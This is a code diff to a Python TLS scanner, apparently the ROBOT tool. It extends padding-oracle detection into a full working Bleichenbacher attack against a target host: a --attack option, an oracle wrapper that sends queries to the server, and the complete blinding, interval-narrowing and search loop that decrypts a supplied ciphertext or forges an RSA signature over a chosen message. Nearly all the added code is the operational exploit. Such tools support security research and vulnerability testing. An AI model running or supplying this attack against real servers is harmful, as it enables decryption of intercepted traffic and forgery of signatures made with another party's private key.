@@ -120,8 +120,36 @@ def oracle(pms, messageflow=False):
         return str(e)
 
 
+def BleichenbacherOracle(cc):
+    global count
+    global countvalid
+    count = count + 1
+    if count % 1000 == 0:
+        print (count, "oracle queries")
+    tmp = hex(cc).rstrip("L").lstrip("0x").rjust(modulus_bits // 4, '0')
+    pms = bytearray.fromhex(tmp)
+    o = oracle(pms, messageflow=flow)
+    if o == oracle_good:
+        # Query the oracle again to make sure it is real...
+        o = oracle(pms, messageflow=flow)
+        if o == oracle_good:
+            countvalid += 1
+            return True
+        else:
+            print("Inconsistent result from oracle.")
+            return False
+    else:
+        return False
+
+
 parser = argparse.ArgumentParser(description="Bleichenbacher attack")
 parser.add_argument("host", help="Target host")
+group = parser.add_mutually_exclusive_group()
+group.add_argument("-r", "--raw", help="Message to sign or decrypt (raw hex bytes)")
+group.add_argument("-m", "--message", help="Message to sign (text)")
+parser.add_argument("s0", nargs="?", default="1", help="Start for s0 value (default 1)")
+parser.add_argument("limit", nargs="?", default="-1", help="Start for limit value (default -1)")
+parser.add_argument("-a", "--attack", help="Try to attack if vulnerable", action="store_true")
 parser.add_argument("-p", "--port", metavar='int', default=443, help="TCP port")
 parser.add_argument("-t", "--timeout", default=5, help="Timeout")
 parser.add_argument("-q", "--quiet", help="Quiet", action="store_true")
@@ -270,3 +298,152 @@ if not args.quiet:
     print("Result of bad request 2 (wrong 0x00 position): %s" % oracle_bad2)
     print("Result of bad request 3 (missing 0x00):        %s" % oracle_bad3)
     print("Result of bad request 4 (bad TLS version):     %s" % oracle_bad4)
+
+# Only continue if we want to attack
+if not args.attack:
+    sys.exit(0)
+
+
+B = int("0001" + "00" * (modulus_bytes - 2), 16)
+
+if args.raw:
+    C = int(args.raw, 16)
+else:
+    if not args.message:
+        msg = "This message was signed with a Bleichenbacher oracle."
+        print('No message given, will sign "This message was signed with a Bleichenbacher oracle."')
+    else:
+        msg = args.message
+    C = int("0001" + "ff" * (modulus_bytes - len(msg) - 3) + "00" + "".join("{:02x}".format(ord(c)) for c in msg), 16)
+
+
+################################################################################
+# define Bleichenbacher Oracle
+count = 0
+countvalid = 0
+
+print("Using the following ciphertext: ", hex(C))
+
+starttime = time.time()
+
+a = int(2 * B)
+b = int(3 * B - 1)
+
+s0 = int(args.s0)
+limit = int(args.limit)
+c0 = C
+# Step 1: Blinding
+print ("Searching for the first valid ciphertext starting %i" % s0)
+if (EXECUTE_BLINDING):
+    while not BleichenbacherOracle(c0):
+        s0 = s0 + 1
+        c0 = (int(gmpy2.powmod(s0, e, N)) * C) % N
+        if (limit != -1) and s0 > limit:
+            quit()
+    print (" -> Found s0: ", s0)
+
+
+M = set()
+M.add((a, b))
+Mnew = set()
+Mnext = set()
+previntervalsize = 0
+i = 1
+while True:
+
+    # find pairs r,s such that m*s % N = m*s-r*N is PKCS conforming
+    # 2.a)
+    if i == 1:
+        s = N // (3 * B)
+        cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
+        while not BleichenbacherOracle(cc):
+            s += 1
+            cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
+
+    # 2.b)
+    if not i == 1 and len(M) >= 2:
+        s += 1
+        cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
+        while not BleichenbacherOracle(cc):
+            s += 1
+            cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
+
+    # 2.c)
+    if not i == 1 and len(M) == 1:
+        a, b = M.pop()
+        M.add((a, b))
+        r = 2 * (b * s - 2 * B) // N
+        s = -(-(2 * B + r * N // b))
+        cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
+        while not BleichenbacherOracle(cc):
+            s += 1
+            if s > ((3 * B + r * N) // a):
+                r += 1
+                s = -(-(2 * B + r * N) // b)
+            cc = (int(gmpy2.powmod(s, e, N)) * c0) % N
+
+    # compute all possible r, depending on the known bounds on m.
+    # Use that 2*B+r*N <= ms <= 3*B-1+r*N
+    # is equivalent to (a*s-3*B-1)/N <= r <= (b*s-2*B)/N
+    # 3.
+    for MM in M:
+        a, b = MM
+        rmax = (b * s - 2 * B) // N
+        rmin = -(-(a * s - 3 * B - 1) // N)
+        # for all possible pairs (s,r) we obtain bounds
+        # (2*B+r*N)/s) <= m <= (3*B+1+r*N)/s) on m.
+        # Add bounds only if they make sense, i.e., if a < b.
+        for r in range(rmin, rmax + 1):
+            anew = (2 * B + r * N) // s
+            bnew = -(-(3 * B + 1 + r * N) // s)
+            if anew < bnew:
+                Mnew.add((anew, bnew))
+
+    # Keep only intervals which are compatible with previous intervals
+    Mnext.clear()
+    for MMnew in Mnew:
+        anew, bnew = MMnew
+        for MM in M:
+            a, b = MM
+            if (bnew <= b and bnew >= a) or (anew >= a and anew <= b) or (anew >= a and bnew <= b and anew <= bnew) or (anew <= a and bnew >= b):
+                Mnext.add((max([a, anew]), min([b, bnew])))
+
+    M.clear()
+    Mnew.clear()
+    M |= Mnext
+
+    if len(M) == 1:
+        a, b = M.pop()
+        M.add((a, b))
+        intervalsize = int(math.ceil(math.log(b - a, 2)))
+        if not intervalsize == previntervalsize:
+            previntervalsize = intervalsize
+            print(count, "oracle queries, Interval size:", intervalsize, "bit.")
+#                        print ("min: " , hex(a))
+#                        print ("max: " , hex(b))
+        if intervalsize < 10:
+            break
+
+    i += 1
+
+print
+print ("Starting exhaustive search on remaining interval")
+
+print ("min: ", hex(a))
+print ("max: ", hex(b))
+
+while not c0 == int(gmpy2.powmod(a, e, N)):
+    a += 1
+
+print ("C:      ", hex(C))
+print ("result: ", hex(a))
+
+if s0 != 1:
+    x = int(gmpy2.invert(s0, N))
+    res = (x * a) % N
+    print ("result after unblinding: ", hex(res))
+
+stoptime = time.time()
+print ("Time elapsed:", stoptime - starttime, "seconds (=", (stoptime - starttime) / 60, "minutes)")
+print ("Modulus size:", int(math.ceil(math.log(N, 2))), "bit. About", (stoptime - starttime) / math.ceil(math.log(N, 2)), "seconds per bit.")
+print (count, "oracle queries performed,", countvalid, "valid ciphertexts.")
